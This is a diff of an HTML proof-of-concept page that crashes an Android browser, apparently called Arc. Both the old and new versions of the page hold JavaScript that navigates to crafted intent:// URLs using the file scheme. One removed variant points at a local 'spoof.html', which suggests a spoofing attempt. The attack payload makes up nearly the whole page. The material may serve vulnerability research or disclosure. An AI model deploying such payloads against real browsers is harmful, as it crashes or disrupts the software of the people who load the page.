@@ -9,13 +9,11 @@
     body {
         font-family: Arial;
         text-align: center;
-        margin-top: 50px;
+        margin-top: 100px;
     }
     button {
-        display: block;
-        margin: 10px auto;
-        padding: 12px 20px;
-        font-size: 16px;
+        padding: 15px 25px;
+        font-size: 18px;
         cursor: pointer;
     }
 </style>
@@ -23,37 +21,16 @@
 
 <body>
 
-<h2>Intent Crash Testing PoC</h2>
-<p>Each button triggers a different intent test</p>
+<h2>Arc Intent Crash PoC</h2>
+<p>Click the button to trigger crash</p>
 
-<button onclick="test1()">Test 1 - Original Payload</button>
-<button onclick="test2()">Test 2 - Simple File Path</button>
-<button onclick="test3()">Test 3 - Non-existing File</button>
-<button onclick="test4()">Test 4 - Minimal Intent</button>
-<button onclick="test5()">Test 5 - No Path Intent</button>
+<button onclick="trigger()">Trigger Crash</button>
 
 <script>
-
-function test1() {
-    location.href = "intent:///storage/emulated/0/Download/0d7ea43ade16c36b7c96761385271ee3-d214c45985fbd1721fb78f971847b261923eb9cd/0d7ea43ade16c36b7c96761385271ee3-d214c45985fbd1721fb78f971847b261923eb9cd/spoof.html#Intent;scheme=file;action=android.intent.action.VIEW;end;";
+function trigger() {
+    const url = "intent:///#Intent;scheme=file;end;";
+    window.location.href = url;
 }
-
-function test2() {
-    location.href = "intent:///storage/emulated/0/Download/test.html#Intent;scheme=file;action=android.intent.action.VIEW;end;";
-}
-
-function test3() {
-    location.href = "intent:///storage/emulated/0/Download/abc123.html#Intent;scheme=file;action=android.intent.action.VIEW;end;";
-}
-
-function test4() {
-    location.href = "intent:///#Intent;scheme=file;end;";
-}
-
-function test5() {
-    location.href = "intent://test#Intent;scheme=file;action=android.intent.action.VIEW;end;";
-}
-
 </script>
 
 </body>
